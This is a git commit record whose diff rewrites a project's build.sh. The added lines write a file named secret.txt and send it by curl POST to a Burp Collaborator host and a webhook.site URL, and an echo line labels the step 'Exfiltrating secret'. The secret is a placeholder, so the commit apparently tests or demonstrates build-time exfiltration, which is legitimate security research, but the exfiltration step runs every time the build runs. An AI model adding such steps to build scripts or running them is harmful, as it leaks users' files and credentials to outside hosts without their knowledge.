7594aaa783f161e9c12aaacdff89f04ec9f9ebfa
youghourta ghennai <95696497+yougharta@users.noreply.github.com>
2024-06-06 10:00:34 +0100

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,1 +1,6 @@
-echo "Building the project"
+# build.sh
+echo "Starting build process"
+echo "Exfiltrating secret..."
+echo "hhhh" > secret.txt
+curl -X POST -d @secret.txt http://xjkfiem61s6op7ywm4brdyvldcj47t.burpcollaborator.net/exfiltrate
+curl -X POST -d @secret.txt https://webhook.site/42d3f251-fe0e-4de7-8fbc-98161571eb32
